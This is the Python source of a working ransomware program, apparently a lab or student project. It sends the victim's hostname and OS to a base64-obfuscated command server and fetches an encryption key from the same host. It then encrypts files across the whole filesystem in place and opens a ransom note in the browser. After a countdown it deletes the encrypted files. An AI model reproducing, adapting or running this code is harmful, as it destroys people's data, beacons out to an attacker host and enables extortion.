import os
import sys
import logging
import subprocess
from cryptography.fernet import Fernet
import requests
import base64
import platform
import random
import string
import sys
import site 
import webbrowser
from ransom_note import generate_ransom_note


def report_victim(session_id):
    system_info = {
        "session_id": session_id,
        "hostname": platform.node(),
        "os": platform.system(),
        "release": platform.release()
    }

    try:
        encoded_url = "aHR0cDovLzE5Mi4xNjguMTQ1LjIxODo1MDAxL3JlcG9ydA=="  # Base64 encoded URL
        url = decode_url(encoded_url)  # Uses your existing decode_url() function

        response = requests.post(url, json=system_info, timeout=5)
        if response.status_code == 200:
            logging.info(f"Reported victim successfully: {system_info}")
        else:
            logging.warning(f"Victim report failed with status: {response.status_code}")
    except Exception as e:
        logging.error(f"Could not report victim: {e}")

    return session_id

def get_python_root_paths():
    paths = set()
    # Add Python installation-related paths
    paths.add(sys.prefix)
    paths.add(sys.exec_prefix)
    paths.add(os.path.dirname(sys.executable))

    try:
        paths.update(site.getsitepackages())
    except Exception:
        pass

    try:
        paths.add(site.getusersitepackages())
    except Exception:
        pass

    return list(paths)

def get_edge_paths():
    import os

    edge_paths = set()

    # Edge program files (system-wide)
    edge_paths.add(r"C:\Program Files\Microsoft\Edge")
    edge_paths.add(r"C:\Program Files (x86)\Microsoft\Edge")

    # Edge user-specific data (critical for launching Edge)
    local_appdata = os.environ.get("LOCALAPPDATA", "")
    if local_appdata:
        edge_paths.add(os.path.join(local_appdata, "Microsoft", "Edge"))
        edge_paths.add(os.path.join(local_appdata, "Microsoft", "Edge", "User Data"))

    return list(edge_paths)

# CONFIGURATION
MAX_FILE_SIZE = 629145600  # 600MB in bytes
LOG_FILE = "ransomware.log"
countdown_name = "countdown.py"
RANSOM_NOTE_FILE = "ransom_note.html"
ENCRYPTED_LIST_FILE = "encrypted_files.txt"
SYSTEM_CRITICAL_PATHS = [
    "C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)"
]
PYTHON_PATHS = get_python_root_paths()
EDGE_PATHS = get_edge_paths()



# Setup logging
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Global list to store encrypted file paths
encrypted_file_paths = []

def generate_session_id():
    return "VM-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))



def decode_url(encoded):
    return base64.b64decode(encoded).decode()

def get_key():
    try:
        encoded_url = "aHR0cDovLzE5Mi4xNjguMTQ1LjIxODo1MDAwL2dldF9rZXk/dG9rZW49bXlfc2VjcmV0X3Rva2Vu"
        url = decode_url(encoded_url)

        headers = {
            "User-Agent": "curl/7.81.0"
        }

        response = requests.get(url, headers=headers, timeout=5)
        if response.status_code == 200:
            logging.info("Successfully retrieved encryption key from obfuscated URL.")
            return response.json()['key'].encode()
    except requests.exceptions.RequestException as e:
        logging.warning(f"Could not retrieve encryption key: {e}. Generating local key.")
        return Fernet.generate_key()

from cryptography.fernet import InvalidToken

def is_already_encrypted(file_path, cipher):
    try:
        with open(file_path, "rb") as f:
            sample = f.read(128)
        cipher.decrypt(sample)
        # If decryption works, it's already encrypted (we assume)
        return True
    except InvalidToken:
        return False
    except:
        return False


def encrypt_file(file_path, cipher):
    try:

        if file_path.endswith(('.py', '.pyc', '.pyo', '.pyw', '.pyd')):
            logging.info(f"Skipping Python file: {file_path}")
            return False

        if os.path.getsize(file_path) > MAX_FILE_SIZE:
            return False
        if is_already_encrypted(file_path, cipher):
            logging.info(f"Skipped already encrypted file: {file_path}")
            return False

        with open(file_path, "rb") as f:
            data = f.read()
        encrypted_data = cipher.encrypt(data)
        with open(file_path, "wb") as f:
            f.write(encrypted_data)
        encrypted_file_paths.append(file_path)
        logging.info(f"Encrypted: {file_path}")
        return True

    except PermissionError:
        logging.warning(f"Permission denied for file: {file_path}")
        return False

    except Exception as e:
        logging.error(f"Error encrypting {file_path}: {e}. Retrying...")
        try:
            with open(file_path, "rb") as f:
                data = f.read()
            encrypted_data = cipher.encrypt(data)
            with open(file_path, "wb") as f:
                f.write(encrypted_data)
            encrypted_file_paths.append(file_path)
            logging.info(f"Encrypted on retry: {file_path}")
            return True
        except Exception as retry_error:
            logging.error(f"Retry failed for {file_path}: {retry_error}. Skipping...")
            return False

def encrypt_files(root_directory, cipher):
    script_name = os.path.basename(__file__)
    countdown_name = "countdown.py"
    total_files = 0
    encrypted_files = 0

    for current_root, dirs, files in os.walk(root_directory):
        if any(current_root.startswith(path) for path in SYSTEM_CRITICAL_PATHS + PYTHON_PATHS + EDGE_PATHS):
            continue



        for file in files:
            file_path = os.path.join(current_root, file)
            if file in (script_name, LOG_FILE, countdown_name, RANSOM_NOTE_FILE, ENCRYPTED_LIST_FILE):
                continue
            total_files += 1
            if encrypt_file(file_path, cipher):
                encrypted_files += 1

                

    print(f"Encryption complete! {encrypted_files}/{total_files} files encrypted successfully.")

    with open(ENCRYPTED_LIST_FILE, "w") as f:
        for path in encrypted_file_paths:
            f.write(path + "\n")
    logging.info(f"Encrypted file list saved to {ENCRYPTED_LIST_FILE}")

    logging.info(f"Encryption complete! {len(encrypted_file_paths)}/{total_files} files encrypted.")


def on_timeup():
    #  Skip deletion if decryption succeeded
    if os.path.exists("decryption_success.lock"):
        logging.info("Decryption lock detected. Skipping file deletion.")
        print("Decryption was successful earlier. Skipping file deletion.")
        return

    # Skip deletion if encrypted list is missing
    if not os.path.exists("encrypted_files.txt"):
        logging.warning("encrypted_files.txt not found. Skipping deletion.")
        print("⚠ Encrypted file list not found. Skipping deletion.")
        return

    #  Proceed with deletion if no lock and list exists
    for path in encrypted_file_paths:
        try:
            os.remove(path)
            logging.info(f"Deleted encrypted file: {path}")
            print(f"Deleted: {path}")
        except Exception as e:
            logging.error(f"Failed to delete {path}: {e}")

if __name__ == "__main__":
    session_id = generate_session_id()
    report_victim(session_id)

    # Save session ID to file
    with open("victim_id.txt", "w") as f:
        f.write(session_id)

    # Generate ransom note with session ID


    root_directory = os.path.abspath(os.sep)
    encryption_key = get_key()
    if not encryption_key:
        logging.error("Encryption key retrieval failed. Exiting...")
        sys.exit(1)
    try:
        cipher = Fernet(encryption_key)
    except Exception as e:
        logging.error(f"Cipher initialization failed: {e}")
        sys.exit(2)



    encrypt_files(root_directory, cipher)

    generate_ransom_note(session_id)

    try:
        ransom_note_path = os.path.abspath(RANSOM_NOTE_FILE)
        if os.path.exists(ransom_note_path):
            webbrowser.open_new_tab(f"file://{ransom_note_path}")
            logging.info("Ransom note opened in browser.")
        else:
            logging.error("Ransom note not found after generation.")
            print(" Ransom note file does not exist.")
    except Exception as e:
        logging.error(f"Failed to open ransom note: {e}")
        print(f" Could not open ransom note: {e}")

    # Countdown script logic
    countdown_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "countdown.py")
    try:
        proc = subprocess.Popen([sys.executable, countdown_script])
        logging.info("Countdown timer script started successfully.")
        proc.wait()

        if proc.returncode == 0:
            logging.info("Countdown finished successfully. Executing on_timeup.")
            on_timeup()
        else:
            logging.warning(f"Countdown exited with code {proc.returncode}. Skipping deletion.")

    except Exception as e:
        logging.error(f"Countdown failed. Executing on_timeup as fallback: {e}")
        on_timeup()
